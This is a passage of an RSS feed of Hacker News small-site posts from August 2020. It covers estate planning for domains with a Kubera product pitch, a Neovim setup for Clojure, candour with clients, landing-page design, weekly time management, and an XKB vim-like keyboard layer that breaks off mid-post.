personal information and, oftentimes, payment information stored. Making sure your beneficiaries have access to all these accounts will greatly simplify the process of organizing and closing them after your death.<br></p><p>That’s why, for domains, but also <em>all</em> other digital assets and accounts, <a href="https://www.kubera.com/blog/using-excel-or-google-sheets-for-tracking-net-worth">everyone should have a digital inventory</a>. This should include every account you own, passwords, associated phone numbers and email addresses, and, for any accounts that require payments or renewals, the dates and costs for renewal.<br></p><p>Your digital inventory should be available <a href="https://www.kubera.com/blog/which-important-financial-documents-should-you-safekeep">both online and offline</a> (like in a safe deposit box that a trusted beneficiary can access) and should be updated regularly.<br></p><h3>Write a Digital Will<br></h3><p>If you’re a sole trader or proprietor, your business assets, including domains and other digital assets, are legally indistinguishable from you, and would be distributed <a href="https://www.kubera.com/blog/wills-trusts-and-estate-planning-not-enough-to-protect-wealth">according to your will</a>.<br></p><p>However, it’s becoming a more common practice for people who hold a variety of digital wealth assets to write a digital will, specifying exactly how they want things like their domains passed on after their death. It’s also becoming a more common practice to name a digital executor for that will — someone who has the knowledge and experience to ensure that digital assets are transferred safely and correctly.<br></p><h3>Use a Portfolio Manager That’s Made for the Digital Age<br></h3><p>It’s long been standard practice to use a portfolio manager for tracking net worth and organizing investments in one place — a good practice that makes them easier to distribute after you’re gone.<br></p><p>But as we move forward in the digital age, wealth and investments are becoming more complex, and most traditional portfolio managers aren’t up to the task of <a href="https://www.kubera.com/blog/portfolio-manager-to-track-fiat-currency-crypto-portfolios">tracking digital wealth like crypto wallets, multi-currency accounts, and domains</a>. That’s why you need a portfolio manager that’s made for the digital age. That’s why <a href="https://www.kubera.com/">you need Kubera</a>.<br></p><p>Not only does Kubera allow you to track <em>all</em> your wealth assets — from the traditional, like stocks, bonds, bank accounts, cash, and real estate, to the modern, like collectibles, crypto exchanges and wallets, domains, and other digital assets. Kubera is also made to ensure safe and secure transfer of <em>all</em> your wealth to a beneficiary in the event something happens to you. You can even set a beneficiary to receive access to your portfolio automatically if your account becomes inactive for a set period of time.<br></p><p>Kubera is the only way to manage and protect your wealth in the digital age. Ready to see for yourself? <a href="https://app.kubera.com/signup">Try all our features free for 100 days</a>.<br></p></div></div>]]>
            </description>
            <link>https://www.kubera.com/blog/what-happens-to-your-domains-when-you-die</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272178</guid>
            <pubDate>Tue, 25 Aug 2020 15:14:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[(N)vim for Clojure development]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272116">thread link</a>) | @tomekw
<br/>
August 25, 2020 | https://tomekw.com/nvim-for-clojure-development/ | <a href="https://web.archive.org/web/*/https://tomekw.com/nvim-for-clojure-development/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Everything you need to write Clojure using (N)vim.</p>

<p>I used different editors and IDEs over the years: Netbeans, Vim, Emacs, and IntelliJ.
And on all of them, I always enabled Vim keybindings.</p>

<p>Few months ago, after more than 10 years writing Ruby, I started my first commercial
role as a Clojure Software Engineer at <a href="https://commsor.com/">Commsor</a>! I’m lazy,
so I picked <a href="https://cursive-ide.com/">Cursive IDE</a> (which is great BTW!), with IdeaVim
plugin enabled. Everything worked out of the box, but after while I, obviously, started to envy
my colleagues their custom workflows and setups…</p>

<p>Now that I’m sure I am Vim person to the bone - why not to give it a go? I decided to configure
a pretty minimal, as close to the Vim philosophy, setup as possible. Here it is!</p>

<h3 id="choosing-vim-distribution">Choosing Vim distribution</h3>

<p>I’m on MacOS, so I could either use <a href="https://macvim-dev.github.io/macvim">MacVim</a> distribution,
console <a href="https://neovim.io/">nvim</a>, or some GUI client for it. I decided to try out
<a href="https://github.com/qvacua/vimr">VimR</a> and I’m not disappointed:</p>



<h3 id="essential-plugins">Essential plugins</h3>

<p>I decided to manage my plugin dependencies with <a href="https://github.com/junegunn/vim-plug">vim-plug</a>.
It keeps the configuration file small and readable, and just gets the job done:</p>

<div><div><pre><code><span>" ~/.config/nvim/init.vim</span>

<span>call</span> plug#begin<span>()</span>

<span>" Plugins to install</span>
Plug <span>'first/plugin-vim'</span>
Plug <span>'second/plugin-vim'</span>

<span>call</span> plug#end<span>()</span>

<span>" Rest to the configuation file</span>
<span>" ...</span>
</code></pre></div></div>

<p>To install them we can reloaded the current file (<code>~/.config/nvim/init.vim</code>) with <code>:so %</code>
and run <code>:PlugInstall</code>.</p>

<p>I started by including:</p>

<div><div><pre><code>Plug <span>'tpope/vim-sensible'</span>
Plug <span>'vim-airline/vim-airline'</span>
</code></pre></div></div>

<p>which provide universal set of defaults and a lean status line.</p>

<p>For file and project management I picked <a href="https://github.com/ctrlpvim/ctrlp.vim">ctrlp.vim</a>:</p>

<div><div><pre><code>Plug <span>'ctrlpvim/ctrlp.vim'</span>
</code></pre></div></div>

<p>The only custom configuration I added was setting up additional project root marker and a different
user command to list files based on Git index:</p>

<div><div><pre><code><span>let</span> <span>g:ctrlp_root_markers</span> <span>=</span> <span>[</span><span>'deps.edn'</span><span>]</span>
<span>let</span> <span>g:ctrlp_user_command</span> <span>=</span> <span>[</span><span>'.git'</span><span>,</span> <span>'cd %s &amp;&amp; git ls-files -co --exclude-standard'</span><span>]</span>
</code></pre></div></div>

<p>Also, I chose Apprentice as my color scheme:</p>

<div><div><pre><code>Plug <span>'romainl/Apprentice'</span>

<span>colorscheme</span> apprentice
</code></pre></div></div>

<p>Mandatory screenshot:</p>

<p><img src="https://tomekw.com/assets/images/apprentice.png" alt="Apprentice"></p>

<p>The must-have plugin for everyone is:</p>

<div><div><pre><code>Plug <span>'axelf4/vim-strip-trailing-whitespace'</span>
</code></pre></div></div>

<p>which removes trailing whitespace on modified lines before saving.</p>

<p>Last but not least there is support for searching across the files in the project.
<a href="https://github.com/mileszs/ack.vim">ack.vim</a> supported
by <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> works perfectly!
Importantly, it takes <code>.gitignore</code> settings into account.</p>



<p>and</p>



<p>Custom configuration sets the ripgrep as a backend, closes the search results popup after choosing
the result, and stops the plugin from jumping to the first result automatically.</p>

<div><div><pre><code><span>let</span> <span>g:ackprg</span> <span>=</span> <span>'rg --vimgrep'</span>
<span>let</span> <span>g:ack_autoclose</span> <span>=</span> <span>1</span>
cnoreabbrev Ack Ack<span>!</span>
</code></pre></div></div>

<p>All of that alone would be a potent general-purpose Vim setup.</p>

<h3 id="clojure-support">Clojure support</h3>

<p>To efficiently write Clojure code I needed syntax highlighting, structural editing
support, REPL management, and context-aware autocomplete.</p>

<p>These three plugins:</p>

<div><div><pre><code>Plug <span>'guns/vim-clojure-highlight'</span>
Plug <span>'guns/vim-clojure-static'</span>
Plug <span>'luochen1990/rainbow'</span>
</code></pre></div></div>

<p>give me syntax highlighting, indentation, and rainbow parentheses to better distinguish forms
visually.</p>

<p>Next two plugins:</p>

<div><div><pre><code>Plug <span>'guns/vim-sexp'</span>
Plug <span>'tpope/vim-sexp-mappings-for-regular-people'</span>
</code></pre></div></div>

<p>provide structural editing support with vim-like mappings.</p>

<p>These five:</p>

<div><div><pre><code>Plug <span>'clojure-vim/vim-jack-in'</span>
Plug <span>'radenling/vim-dispatch-neovim'</span>
Plug <span>'SevereOverfl0w/vim-replant'</span><span>,</span> <span>{</span> <span>'do'</span><span>:</span> <span>':UpdateRemotePlugins'</span> <span>}</span>
Plug <span>'tpope/vim-dispatch'</span>
Plug <span>'tpope/vim-fireplace'</span>

</code></pre></div></div>

<p>allow me to start and / or connect to existing nREPL session, with <code>deps.edn</code> support
by just invoking:</p>



<p><code>vim-replant</code> adds handy keybindings for working with Clojure REPLs. Just invoke
<code>&lt;LocalLeader&gt;rf</code> to refresh namespaces by automatically calling your common <code>(stop)</code>/<code>(start)</code>
functions! Magic!</p>

<p>And you know what? All of this doesn’t need a single line of custom configuration.
I love the sane defaults and conventions!</p>

<p>Context-aware autocomplete needs more work, but it’s worth the effort.</p>

<div><div><pre><code>Plug <span>'clojure-vim/async-clj-omni'</span>
Plug <span>'prabirshrestha/asyncomplete.vim'</span>
</code></pre></div></div>

<p>These two plugins provide autocomplete which understands your code by using the existing REPL
connection! <code>asyncomplete</code> doesn’t come with any sources enabled and it needs to be registered:</p>

<div><div><pre><code><span>au</span> <span>User</span> asyncomplete_setup <span>call</span> asyncomplete#register_source<span>({</span>
<span>    \</span> <span>'name'</span><span>:</span> <span>'async_clj_omni'</span><span>,</span>
<span>    \</span> <span>'whitelist'</span><span>:</span> <span>[</span><span>'clojure'</span><span>],</span>
<span>    \</span> <span>'completor'</span><span>:</span> <span>function</span><span>(</span><span>'async_clj_omni#sources#complete'</span><span>),</span>
<span>    \</span> <span>})</span>
</code></pre></div></div>

<p>And that’s all! It’s ready to help you keep all the parentheses balanced :)</p>

<p>The complete configuration file, with few additional plugins, can be found on my
<a href="https://github.com/tomekw/dontfiles/blob/master/.config/nvim/init.vim">tomekw/dontfiles</a> repo.
I’m sure the current setup will grow in the future, but you can track the progress by following
me on <a href="https://twitter.com/_tomekw">Twitter</a>!</p>

    </div></div>]]>
            </description>
            <link>https://tomekw.com/nvim-for-clojure-development/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272116</guid>
            <pubDate>Tue, 25 Aug 2020 15:08:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hide a problem from your client and now you've got 2 problems]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272092">thread link</a>) | @mcrittenden
<br/>
August 25, 2020 | https://critter.blog/2020/08/25/hide-a-problem-from-your-client-and-now-youve-got-2-problems/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/08/25/hide-a-problem-from-your-client-and-now-youve-got-2-problems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-798">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Once upon a time, I was working on a project that was going pretty well until it wasn’t. Our full time DevOps person suddenly quit and we were struggling to find a replacement, so builds were getting flakier by the day. Plus, the frontend work had slowed to a trickle because one dev had to start splitting time with another project, and the other dev was still ramping up. </p>



<p>That’s what we saw, and it sucked but it was understandable. These things happen.</p>



<p>But what did the client see? <strong>Slow progress</strong>. That’s all they got, because we didn’t tell them about any of our staffing issues. Clients gonna client, so their natural reaction was to panic that work wasn’t getting done and start making wild guesses about why, most of which involved some form of them getting screwed or the team not understanding how important this all is. </p>



<p>We had turned 1 problem (staffing issues) into 2 problems (staffing issues and a thrashing client). Abracadabra!</p>



<hr>



<p>Why do we do this to ourselves and our clients? Why do we try to hide our problems? Because it’s embarrassing that we’re struggling with staffing? Because we don’t want to admit that we don’t know technology X as deeply as we thought? Because we want to be professional, and professionals don’t have problems? Because we don’t want to upset them?</p>



<p>If we want to be professional, then we need to be transparent and say the embarrassing thing. If we want to avoid upsetting them, then we should tell them what’s going on instead of making them guess. <em>Their guesses are usually more upsetting than the truth</em>. </p>



<p>The book <em>Joy Inc</em>. by Richard Sheridan talks a lot about aligning the world’s outside perception of your company with your inside reality: “The message felt quite freeing, because it meant you didn’t have to lie to anybody about anything.” </p>



<p>That’s what we’re doing when we hide things from the client. We’re lying. How professional is that? How does that help anyone?</p>



<p>Stop that. Be radically candid with your clients. Bring them in. Don’t just show them the sausage making, but make the sausage with them instead of for them. That way, when the sausage machine goes haywire, the client can skip the thrashing and focus on the fixing.</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/08/25/hide-a-problem-from-your-client-and-now-youve-got-2-problems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272092</guid>
            <pubDate>Tue, 25 Aug 2020 15:07:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things Every Landing Page Should Have]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272071">thread link</a>) | @johannesippen
<br/>
August 25, 2020 | https://toolbox.humandeluxe.com/landing-page-essentials/ | <a href="https://web.archive.org/web/*/https://toolbox.humandeluxe.com/landing-page-essentials/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  



  <p><img src="https://d33wubrfki0l68.cloudfront.net/e7b2e5a7c740261a93e10f899991c533f986e7f6/3e96c/uploads/landing-page-hacks.jpg" alt=""></p>

<p>The difference between a landing page and company website is simple: while the latter is an all-purpose website that people will access from your social media profile or general Google search, the landing serves a more specific purpose. It will usually be the endpoint of an ad campaign, may it be a social media banner campaign, a search ad campaign or even offline, through a special URL or QR code printed on a poster or magazine ad.</p>

<p>A landing page can be covering your whole product or be centered on one specific feature, problem or audience segment. In highly competitive spaces, a landing page can be used to compare your product against a popular competitor, trying to steal away their search traffic.</p>

<p>What all landing pages have in common is their purpose: They will try to convert a visitor into a paying customer – something that we call conversion design. To be successful with that, there is no cookie cutter formula: Every landing page is different, just as every product is different. If someone tries to tell you otherwise, they are probably trying to sell you their templated landing page builder.</p>

<p>However, there a few things that every successful landing page needs to have – regardless of content and design. At Human Deluxe, we have been creating a lot of landing pages – and these are the things that we learned on the way:</p>

<h2 id="1-simple-catchy-entry">1. Simple, Catchy Entry</h2>

<p>To eliminate one big myth first: There is no “fold” on a landing page. Trying to get all the seemingly important elements “above the fold” will make your header section messy and overcrowded. Instead, find a good, simple and catchy way to start your landing page: Start with a short and catchy title that draws attention and invests users emotionally in your product. If you use a visual, try making it simple and readable: A simplified screenshot of your app in a device frame works well, a playful illustration that sets the tone or even a simple moody stock photo that conveys an emotion. Same goes here: Do not overload users, but also make clear: There is more!</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/a39223ff2a1afa279eabc7d9ea82849a67ecd13f/20325/uploads/landing-page-avocode.jpeg" alt=""></p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/68a77217bcaf68643a6b1072aae8c6d7ccbb66db/b3613/uploads/landing-page-stripe.jpeg" alt=""></p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/cd4ed1751f7bd9975be54c7a2479a73cc05487fd/33786/uploads/landing-page-epicurrence.jpg" alt=""></p>

<h2 id="2-one-very-clear-call-to-action">2. One Very Clear Call to Action</h2>

<p>Speaking of conversion, think about what you want your visitors to do, and make it very clear for them. We call this: Call to Action. A call to action is not only a nice big button, but the whole context. Avoid generic texts like “Learn more …” or “Contact us”. Instead, try to manage expectations with your call to action, like:</p>

<ul>
  <li>Start your FREE 30 day trial</li>
  <li>Book a call with Katja</li>
</ul>

<p>For successful call to actions, the context is important: Make sure that your nice big button has enough white space around it to properly stand out. Provide information about what is going happen next or what is not going to happen. A simple hint like: “No credit card required” might be an amazing conversion driver, taking the fear of being ripped off of users.</p>

<h2 id="3-concrete-product-showcase">3. Concrete Product Showcase</h2>

<p>When your landing page is for a concrete product (and it usually is), make sure you show and explain it. Especially in B2B, landing pages often make the mistake of trying to stay too vague around what the user will get, excusing it with “it’s too complicated”, “it’s super individual” or “We will overhaul the whole thing”.</p>

<p>Explain features and requirements, show photos, screenshots or even videos. Take some time to do so – users love to see your actual product before they use it.</p>

<p>In best case, you will have a customised version of your product for the landing page that idealises and simplifies your product, showing demo data, focussed interfaces or even highlights the important sections.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7157128a6aaadd96d7c2acb6a43e91fd52580060/9a292/uploads/landing-page-product.jpeg" alt=""></p>

<h2 id="4-structured-information">4. Structured Information</h2>

<p>Think of all the questions that a visitor could have and try to answer them, in a simple and structured way. A good way to do this is a kind of FAQ section: Short questions, clear &amp; short answers. Don’t be afraid of being redundant: What you want to have here is an inclusive and accessible experience, where people get the information, even if they missed it in the first 3 placements.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/30e8345aa637bc3fbd72c97c1a73c91f9cfbd240/8e154/uploads/landing-page-faq.jpeg" alt=""></p>

<p>Structuring information in a simple and expected way helps users to consume it very quickly – don’t try to be too innovative here, this will rather scare people.</p>

<h2 id="5-show-your-face">5. Show your Face</h2>

<p>Lastly, show the team: Who is making the product? It may seem irrelevant to the product, but we Human beings tend to trust other more than we trust products or concepts. So in order to build an engaging, converting landing page – make sure that you are a part of it.</p>

<p>I hope these help you create or improve your own landing page. What other best practices do you have? Let me know on Twitter or Instagram: <a href="https://twitter.com/johannesippen">@johannesippen</a></p>

</div></div>]]>
            </description>
            <link>https://toolbox.humandeluxe.com/landing-page-essentials/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272071</guid>
            <pubDate>Tue, 25 Aug 2020 15:05:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to split your time – tips from a Lead at Google]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271926">thread link</a>) | @windy-topology
<br/>
August 25, 2020 | https://www.lifetechpsych.com/tips-from-googler/ | <a href="https://web.archive.org/web/*/https://www.lifetechpsych.com/tips-from-googler/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="8"><p>The beginning of the week is the worst.</p>
<p>And to be honest, it doesn’t feel any different from last week.</p>
<p>And the week before — <em>slow, boring, simply-looking-forward-to-Friday</em>.</p>
<h2>Dragging through a slow start</h2>
<p>For many, Monday is the least productive day and it comes with a lot of guilt that sets the tone for the rest of the week. </p>
<p>I see all over the internet, especially on LinkedIn, how you should start your week with so much enthusiasm. </p>
<blockquote>
<p><em>Yeah! New week! New me! New possibilities!”</em> </p>
</blockquote>
<p>Ummm maybe they’re unto something - good for them. But in reality, most Mondays feel like:</p>
<blockquote>
<p><em>New week! Ugh! It’s sooooo long until the weekend!</em></p>
</blockquote>
<p>Then it’s Tuesday. Same story.</p>
<p>I don’t know about you but this is usually the summary of many weekends for me:</p>
<ul>
<li>It was too short.</li>
<li>I had this feeling last week.</li>
<li>I had the same this week.</li>
<li>At this rate, I’ll have this feeling next week.</li>
</ul>
<h2>A potential solution</h2>
<p>I’ve been thinking a lot about this. </p>
<p>And recently found a breakdown by <a href="https://twitter.com/jeremiahdillon">Jeremiah Dillon</a>, previously Head of Product Marketing at Google for 9 years, to be super helpful.</p>
<p>At Google, Dillon <a href="https://www.fastcompany.com/3054571/the-better-time-management-strategy-this-googler-taught-his-coworkers">sent an email</a> that encouraged employees to set aside more time for <em>Maker Time — our creativity and thinking time —</em> instead of having endless busy times, back to back.</p>
<p>Here’s a <a href="https://www.youtube.com/watch?v=noc-DKZoNGU">2-minute video</a> on this concept.
<a href="https://www.youtube.com/watch?v=noc-DKZoNGU">
  </a><a href="https://www.lifetechpsych.com/static/youtube-2377829a910c408f124d14e92b1a4337-1062e.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="Youtube video" title="" src="https://www.lifetechpsych.com/static/youtube-2377829a910c408f124d14e92b1a4337-fb8a0.png" srcset="https://www.lifetechpsych.com/static/youtube-2377829a910c408f124d14e92b1a4337-1a291.png 148w,
https://www.lifetechpsych.com/static/youtube-2377829a910c408f124d14e92b1a4337-2bc4a.png 295w,
https://www.lifetechpsych.com/static/youtube-2377829a910c408f124d14e92b1a4337-fb8a0.png 590w,
https://www.lifetechpsych.com/static/youtube-2377829a910c408f124d14e92b1a4337-526de.png 885w,
https://www.lifetechpsych.com/static/youtube-2377829a910c408f124d14e92b1a4337-fa2eb.png 1180w,
https://www.lifetechpsych.com/static/youtube-2377829a910c408f124d14e92b1a4337-1062e.png 1360w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </p>
<p>In summary: first set aside more time for creativity by reducing the amount of busy times you have. Then align your days throughout the week with your energy level.</p>
<p><strong>Instead of fighting a lost battle with slow week starts, use Mondays to proactively plan your maker time and to align your energy level with tasks for the rest of the week.</strong></p>
<p>Make sense? </p>
<p>Now, don’t just make plans for planning sake. You want your plan to drive down busy time while also increasing maker time. </p>
<p>
  <a href="https://www.lifetechpsych.com/static/chart-0821bc8879ca96bfba3ef7c06990d881-66b54.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="Busy Time vs Maker Time" title="" src="https://www.lifetechpsych.com/static/chart-0821bc8879ca96bfba3ef7c06990d881-fb8a0.png" srcset="https://www.lifetechpsych.com/static/chart-0821bc8879ca96bfba3ef7c06990d881-1a291.png 148w,
https://www.lifetechpsych.com/static/chart-0821bc8879ca96bfba3ef7c06990d881-2bc4a.png 295w,
https://www.lifetechpsych.com/static/chart-0821bc8879ca96bfba3ef7c06990d881-fb8a0.png 590w,
https://www.lifetechpsych.com/static/chart-0821bc8879ca96bfba3ef7c06990d881-526de.png 885w,
https://www.lifetechpsych.com/static/chart-0821bc8879ca96bfba3ef7c06990d881-fa2eb.png 1180w,
https://www.lifetechpsych.com/static/chart-0821bc8879ca96bfba3ef7c06990d881-66b54.png 1282w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    
&nbsp; &nbsp; &nbsp; <em>The higher your busy time, the lower your maker time; but you can plan ahead more maker time by reducing your busy time.</em></p>
<h2>What the chart means</h2>
<p>The chart moves from 100% busy time to 100% maker time.</p>
<p>But 100% maker time is an idealistic state. We most likely will never get there. And that’s fine. I like to think of it as a form of stretch goal.</p>
<p>If you picture the top left corner of the graph, most of us reside there: <em>busy, exhausting, working on back-to-back tasks</em>.</p>
<p>A more realistic place to shoot for is somewhere, a little past the center where you’re still busy but you’ve set aside even more maker time. </p>
<p>Then on the far right is where you keep pushing yourself to, as you go more towards the right, it becomes much tougher to achieve 100%.</p>
<h2>Let’s look at a specific example</h2>
<p>Here’s a breakdown of an example week by Dillon:</p>
<p><strong>Monday</strong></p>
<p>Energy ramps out of the weekend — schedule low-demand tasks like setting goals, organizing, and planning.</p>
<p><strong>Tuesday, Wednesday</strong></p>
<p>Peak of energy — tackle the most difficult problems, write, brainstorm, schedule your Make Time.</p>
<p><strong>Thursday</strong></p>
<p>Energy begins to ebb — schedule meetings, especially when consensus is needed.</p>
<p><strong>Friday</strong></p>
<p>Lowest energy level — do open-ended work, long-term planning, and relationship building.”</p>
<h2>But I don’t manage anyone</h2>
<p>That’s ok. </p>
<p>You actually don’t have to be a manager to follow the high level principle. You don’t even have to work for a company.</p>
<p>You can adapt it for:</p>
<ul>
<li>
<p><strong>Workouts</strong>: Days where you want to do a full work out. Plan ahead something simple for days when you notice your energy is typically low</p>
</li>
<li>
<p><strong>Writing</strong>: You have a book to write but feel lazy in the evenings. You can use that period to plan titles for the book, outline for chapters, etc. But then dedicate your high energy in the mornings to writing at least one pages.</p>
</li>
<li>
<p><strong>Meditation/House Chores/Job application/etc</strong>: Plan ahead for low-energy moments.</p>
</li>
</ul>
<h2>Your next action</h2>
<p>Maybe for you, Mondays are not slow.</p>
<p>It could be Tuesday or Thursday.</p>
<p>The most important takeaway is that you should chunk your activities by different days of the week or different hours of the day and align them with your energy level.</p>
<p>That way, you’ll feel more balance and control in how your week goes.</p>
<p><strong>Remember, simple little actions everyday are what add up to the big transformation we all desire.</strong></p>
<p>The goal of this post is to push you to proactively remove barriers that will prevent you from starting a task in the future. By planning ahead simple tasks for when you feel lazy, you increase your chance of showing up everyday.</p>
<h2>Thanks for Reading</h2>
<p>Have any questions or comments, <a href="https://ctt.ac/I1f33">let me know on Twitter</a>. Until the next post – see ya</p></div></div>]]>
            </description>
            <link>https://www.lifetechpsych.com/tips-from-googler/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271926</guid>
            <pubDate>Tue, 25 Aug 2020 14:53:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vim-Like Layer for Xorg and Wayland]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271904">thread link</a>) | @todsacerdoti
<br/>
August 25, 2020 | https://cedaei.com/posts/vim-like-layer-for-xorg-wayland/ | <a href="https://web.archive.org/web/*/https://cedaei.com/posts/vim-like-layer-for-xorg-wayland/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
        
<h2 id="insert-mode">Insert Mode<a href="#insert-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/insert_mode.jpg" alt="Insert Mode: A keyboard layout similar to normal QWERTYlayout"></p>
<h2 id="normal-mode">Normal Mode<a href="#normal-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/normal_mode.jpg" alt="Normal Mode: A keyboard layout with the alphabet keys replaced with shortcutkey"></p>
<p>Inspired by vim, I wanted to create a layer on top of my keyboard which worked
like a shortcut layer. So, to start off, I found out about XKB<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. XKB is the
Xorg Keyboard Extension which tells Xorg on how to react to input from
keyboard.  After reading through some source code, I found out that Xorg has
support for function keys F1 - F35<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The general idea here was:</p>
<ul>
<li>Create an insert mode layout for text input.</li>
<li>Replace keys with relevant keys in normal mode (e.g. replace j with Down) and
for keys that require executing a command, replace then with a function key
above F12 (e.g. replace q with F13).</li>
<li>Bind all the function keys above F12 to the respective functions.</li>
</ul>
<p>To start off, I began a fresh Xorg session with nothing modifying the keys
(removed <code>xmodmap</code> from startup) and first dumped the current layout into a
file.</p>
<div><pre><code data-lang="bash">xkbcomp $DISPLAY ~/.xkb/insert.xkb
</code></pre></div><p>This was my starting point. I made changes to this file which were common to
both Insert and Normal mode. e.g. replaced <code>Caps Lock</code> with <code>Ctrl</code> and made
<code>Shift+Caps Lock</code> <code>Caps Lock</code>. Also, I unbound <code>Alt_R</code> as a modifier so that I
could use that as a switch between Normal and Insert Mode.</p>
<p>Here is a diff between the original layout and Insert mode.</p>
<pre><code>1323c1321
&lt;     key &lt;CAPS&gt; {         [       Caps_Lock ] };
---
&gt;     key &lt;CAPS&gt; {         [       Control_L,       Caps_Lock ] };
1551c1549
&lt;     modifier_map Lock { &lt;CAPS&gt; };
---
&gt;     modifier_map Control { &lt;CAPS&gt; };
1555d1552
&lt;     modifier_map Mod1 { &lt;RALT&gt; };
</code></pre><p>Next, I copied <code>~/.xkb/insert.xkb</code> to <code>~/.xkb/normal.xkb</code>. I replaced keys as
per the plan.</p>
<p>Here is a diff between Insert mode and Normal mode.</p>
<div><pre><code data-lang="diff">1200c1200
&lt;         symbols[Group1]= [               q,               Q ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F13]
1204c1204
&lt;         symbols[Group1]= [               w,               W ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F14]
1208c1208
&lt;         symbols[Group1]= [               e,               E ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F15]
1212c1212
&lt;         symbols[Group1]= [               r,               R ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F16]
1216c1216
&lt;         symbols[Group1]= [               t,               T ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F17]
1220c1220
&lt;         symbols[Group1]= [               y,               Y ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F18]
1224c1224
&lt;         symbols[Group1]= [               u,               U ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F19]
1228c1228
&lt;         symbols[Group1]= [               i,               I ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Alt_R]
1232c1232
&lt;         symbols[Group1]= [               o,               O ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F20]
1236c1236
&lt;         symbols[Group1]= [               p,               P ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F21]
1244c1244
&lt;         symbols[Group1]= [               a,               A ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F22]
1248c1248
&lt;         symbols[Group1]= [               s,               S ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Delete]
1252c1252
&lt;         symbols[Group1]= [               d,               D ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [BackSpace]
1256c1256
&lt;         symbols[Group1]= [               f,               F ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Home]
1260c1260
&lt;         symbols[Group1]= [               g,               G ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [End]
1264c1264
&lt;         symbols[Group1]= [               h,               H ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Left]
1268c1268
&lt;         symbols[Group1]= [               j,               J ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Down]
1272c1272
&lt;         symbols[Group1]= [               k,               K ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Up]
1276c1276
&lt;         symbols[Group1]= [               l,               L ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Right]
1285c1285
&lt;         symbols[Group1]= [               z,               Z ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F23]
1289c1289
&lt;         symbols[Group1]= [               x,               X ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F24]
1293c1293
&lt;         symbols[Group1]= [               c,               C ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F25]
1297c1297
&lt;         symbols[Group1]= [               v,               V ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F26]
1301c1301
&lt;         symbols[Group1]= [               b,               B ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F27]
1305c1305
&lt;         symbols[Group1]= [               n,               N ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Next]
1309c1309
&lt;         symbols[Group1]= [               m,               M ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Prior]
</code></pre></div><p>At this point, <code>normal.xkb</code> file defines the following layout.</p>
<p><img src="https://cedaei.com/images/normal_mode_unbound.jpg" alt="Normal Mode: A keyboard "></p>
